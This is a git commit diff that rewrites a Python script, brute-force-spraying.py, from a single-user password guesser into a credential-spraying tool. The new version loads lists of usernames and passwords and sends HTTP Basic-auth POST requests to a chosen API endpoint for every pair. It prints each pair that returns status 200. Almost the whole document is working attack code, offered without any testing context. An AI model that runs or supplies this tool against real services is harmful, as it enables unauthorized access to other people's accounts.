1cd7ac27901a1396162c5ddd9c5ff13d4641b013
pat mcb <pmcbrien@users.noreply.github.com>
2024-01-25 12:47:41 -0500

    Update brute-force-spraying.py

--- brute-force-spraying.py
+++ brute-force-spraying.py
@@ -1,25 +1,42 @@
 import requests
 from base64 import b64encode
+
 passwordList = []
-worddict = raw_input("Enter path to dictionary file: ")
-url = raw_input("Enter API endpoint: ")
-username = raw_input("Enter Username: ")
+userList =[]
+
+userdict = input("Enter path to user file: ")
+pwdict = input("Enter path to pw file: ")
+url = input("Enter API endpoint: ")
+
 def createPassList(dict_file):
-    d = open(dict_file)
-    for line in d.readlines():
-        password = line.strip('\n')
-        passwordList.append(password)
+    with open(dict_file, 'r') as d:
+        for line in d.readlines():
+            password = line.strip('\n')
+            passwordList.append(password)
+
+def createUserList(dict_file):
+    with open(dict_file, 'r') as d:
+        for line in d.readlines():
+            user = line.strip('\n')
+            userList.append(user)
+
 def tryBrute():
-    for pwd in passwordList:
-        userAndPass = username + ":" + pwd
-        userAndPassEncode = b64encode(userAndPass).decode("ascii")
-        authString = str('Basic %s' %  userAndPassEncode)
-header = {
-           'authorization': authString,
-           'cache-control': "no-cache",
-        }
-response = requests.request("POST", url, headers=headers)
-        if response.status_code == 200:
-            print username + ":" + pwd
-createPassList(worddict)
+    for usr in userList:
+
+        for pwd in passwordList:
+
+            userAndPass = usr + ":" + pwd
+            userAndPassEncode = b64encode(userAndPass.encode()).decode("ascii")
+            authString = str('Basic %s' %  userAndPassEncode)
+            headers = {
+            'authorization': authString,
+            'cache-control': "no-cache",
+            }
+            response = requests.request("POST", url, headers=headers)
+            if response.status_code == 200:
+                print(usr + ":" + pwd)
+            print(response)
+
+createUserList(userdict)
+createPassList(pwdict)
 tryBrute()
